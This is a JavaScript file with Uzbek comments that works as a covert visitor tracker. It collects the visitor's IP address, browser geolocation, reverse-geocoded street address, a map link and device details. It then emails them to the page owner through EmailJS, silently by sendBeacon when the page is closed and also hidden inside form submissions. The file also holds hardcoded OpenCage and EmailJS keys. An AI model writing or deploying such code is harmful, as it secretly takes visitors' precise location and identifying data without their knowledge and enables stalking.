(function () {
  emailjs.init({
    publicKey: "22NQQ3qESfcDnx6Sv",
  });
})();

let ipAddress = "";
let guestSent = false;

async function getIP() {
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    ipAddress = data.ip;
  } catch {
    ipAddress = "Topilmadi";
  }
}

function detectRealBrowser() {
  const ua = navigator.userAgent;
  if (ua.includes("Chrome") && !ua.includes("Edg") && !ua.includes("OPR"))
    return "Google Chrome";
  if (ua.includes("Firefox")) return "Mozilla Firefox";
  if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
  if (ua.includes("Edg")) return "Microsoft Edge";
  if (ua.includes("OPR") || ua.includes("Opera")) return "Opera";
  return "Nomaʼlum brauzer";
}

function getDeviceInfo() {
  const platform = navigator.platform;
  const screenSize = `${screen.width}x${screen.height}`;
  const language = navigator.language;
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  const realBrowser = detectRealBrowser();
  return `
🖥 Platforma: ${platform}
🌐 Brauzer: ${realBrowser}
📏 Ekran: ${screenSize}
🔡 Til: ${language}
🕓 Vaqt zonasi: ${timezone}
`;
}

async function buildFullMessage(position, label = "Tashrif") {
  await getIP();
  const lat = position.coords.latitude;
  const lng = position.coords.longitude;
  const gmapLink = `https://www.google.com/maps?q=${lat},${lng}`;
  const now = new Date().toLocaleString();
  const apiKey = "bf9f7561c868479eb9c0e0e282c9529b";
  const apiUrl = `https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lng}&key=${apiKey}`;

  try {
    const res = await fetch(apiUrl);
    const data = await res.json();
    const location = data.results[0]?.formatted || "Aniq manzil topilmadi";
    const deviceInfo = getDeviceInfo();

    return `
📩 Tashrif turi: ${label}
${deviceInfo}
📍 Latitude: ${lat}
📍 Longitude: ${lng}
🗺️ Aniq manzil: ${location}
🌐 IP manzil: ${ipAddress}
🔗 Google Map: ${gmapLink}
🕒 Sana: ${now}
`;
  } catch {
    return `❌ Maʼlumotlar to‘plashda xatolik`;
  }
}

window.addEventListener("beforeunload", (event) => {
  if (!guestSent && !localStorage.getItem("auto_sent")) {
    navigator.geolocation.getCurrentPosition(async (position) => {
      const autoMessage = await buildFullMessage(
        position,
        "Sahifani yopdi (auto)"
      );

      const formData = {
        service_id: "service_f90ydoz",
        template_id: "template_7wzf3ui",
        user_id: "22NQQ3qESfcDnx6Sv", // sening publicKey'ing
        template_params: {
          message: autoMessage, // <-- template'da aynan `{{message}}` bo‘lishi shart
        },
      };

      const blob = new Blob([JSON.stringify(formData)], {
        type: "application/json",
      });

      const sent = navigator.sendBeacon(
        "https://api.emailjs.com/api/v1.0/email/send",
        blob
      );

      if (sent) {
        console.log("📨 Sahifa yopilishida yuborildi");
        guestSent = true;
        localStorage.setItem("auto_sent", "true");
      } else {
        console.error("❌ sendBeacon yuborilmadi");
      }
    });
  }
});

// Formani yuborish
document.getElementById("myForm").addEventListener("submit", function (e) {
  e.preventDefault();
  navigator.geolocation.getCurrentPosition(async (position) => {
    const fullMsg = await buildFullMessage(position, "Forma yuborildi");
    document.getElementById("location_data").value = fullMsg;

    emailjs
      .sendForm("service_f90ydoz", "template_7wzf3ui", this)
      .then(() => console.log("✅ Forma orqali yuborildi"))
      .catch((err) => console.error("❌ Email xatolik:", err.text));
  });
});
